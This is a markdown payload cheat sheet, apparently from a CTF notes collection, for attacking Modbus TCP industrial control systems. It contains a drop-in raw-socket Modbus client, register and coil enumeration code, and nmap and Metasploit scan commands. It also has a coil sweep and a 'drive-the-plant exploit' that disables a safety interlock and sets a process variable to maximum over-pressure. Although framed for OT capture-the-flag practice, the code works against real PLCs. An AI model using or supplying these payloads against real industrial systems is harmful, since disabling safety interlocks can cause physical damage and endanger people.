---
title: "Payloads: Modbus / ICS"
type: payloads
tags: [payloads, modbus, ics, scada, ot, plc]
sources: []
date_created: 2026-06-29
date_updated: 2026-06-29
---

# Payloads: Modbus / ICS

Raw Modbus TCP toolkit (no `pymodbus` dependency - a socket always works, the library breaks across
versions). Read/write/sweep + the OT-CTF exploit pattern. See [[ics-scada-modbus]].

## Frame
```
MBAP(7) = transId(2) protoId(2=0) length(2) unitId(1)   |   PDU = func(1) data(...)
FC1 read coils   FC2 read discrete   FC3 read holding   FC4 read input
FC5 write coil   FC6 write holding   FC15 write N coils  FC16 write N holding
write-coil value: 0xFF00 = ON, 0x0000 = OFF
```

## Reusable client (drop-in)
```python
import socket,struct
IP,PORT,UNIT='10.0.0.1',502,1
def _req(pdu):
    mb=struct.pack('>HHHB',1,0,len(pdu)+1,UNIT)
    s=socket.socket();s.settimeout(5);s.connect((IP,PORT));s.sendall(mb+pdu);r=s.recv(1024);s.close();return r
def read(fc,addr,qty):                      # fc 1/2 -> bits, 3/4 -> regs
    r=_req(struct.pack('>BHH',fc,addr,qty))
    if len(r)<9 or r[7]&0x80: return 'ERR%d'%(r[8] if len(r)>8 else -1)
    if fc in (1,2): return [(r[9+i//8]>>(i%8))&1 for i in range(qty)]
    return list(struct.unpack('>'+'H'*(r[8]//2),r[9:9+r[8]]))
def wcoil(addr,on):  _req(struct.pack('>BHH',5,addr,0xFF00 if on else 0))
def wreg(addr,val):  _req(struct.pack('>BHH',6,addr,val))
def wcoils(addr,vals):                       # FC15 one packet (the "single crafted modbus")
    bc=(len(vals)+7)//8; b=bytearray(bc)
    for i,v in enumerate(vals):
        if v: b[i//8]|=1<<(i%8)
    _req(struct.pack('>BHHB',15,addr,len(vals),bc)+bytes(b))
```

## Enumerate (dump everything, ASCII-decode)
```python
print('COILS   ',read(1,0,64))
print('DISCRETE',read(2,0,64))
print('HOLDING ',read(3,0,125))
print('INPUT   ',read(4,0,125))
# ASCII-decode regs (creds/flags sometimes stored as ASCII):
v=read(3,0,125); b=b''.join(struct.pack('>H',x) for x in v if isinstance(x,int))
print(''.join(chr(c) if 32<=c<127 else '.' for c in b))
# scan unit/slave ids:
for u in range(0,8): print('unit',u, read(3,0,4))   # set UNIT then read
```
nmap / msf equivalents:
```bash
nmap -Pn -p502 --script modbus-discover --script-args modbus-discover.aggressive=true $T
msfconsole -q -x "use auxiliary/scanner/scada/modbusclient; set RHOSTS $T; set ACTION READ_HOLDING_REGISTERS; run"
mbtget -r3 -a 0 -n 16 $T        # read 16 holding regs
```

## Sweep for the control/safety coil (OT-CTF)
The interesting coil/reg is rarely at 0-5. Set each, watch the HMI oracle for the state flip:
```python
import urllib.request
def state(): return urllib.request.urlopen('http://%s/api/state'%IP,timeout=3).read().decode()
for c in range(16):                  # widen to 0-31 if nothing
    wcoil(c,1); wreg(0,65535)         # set coil + over-pressure
    print('coil%d ->'%c, state())
    wcoil(c,0)
```

## Drive-the-plant exploit (the payoff)
```python
wcoil(10,1)     # disable safety/protection interlock (the swept coil)
wreg(0,65535)   # over-pressure the process variable (max uint16)
# -> HMI flips to the danger state; fetch the media it points at; flag is often a VISUAL overlay:
#   curl 'http://IP/video?mode=<dangerstate>' -o x.mp4 ; ffmpeg -i x.mp4 -vf fps=1 f_%02d.jpg ; view frames
```

## Gotchas
- `pymodbus` API churns (sync/async, `.read_holding_registers(addr,count)` vs `count=`); the raw
  socket above sidesteps it.
- OpenPLC running a program **overwrites outputs each scan** - writing the cooling OUTPUT coil does
  nothing; the exploit coil is a FLAG the ladder reads (set it and it sticks).
- 16-bit registers cap at 65535; a "higher" setpoint may be a second register (32-bit) or a coil.
- Flag in HMI media = VISUAL overlay, not strings/exif -> extract + view frames.
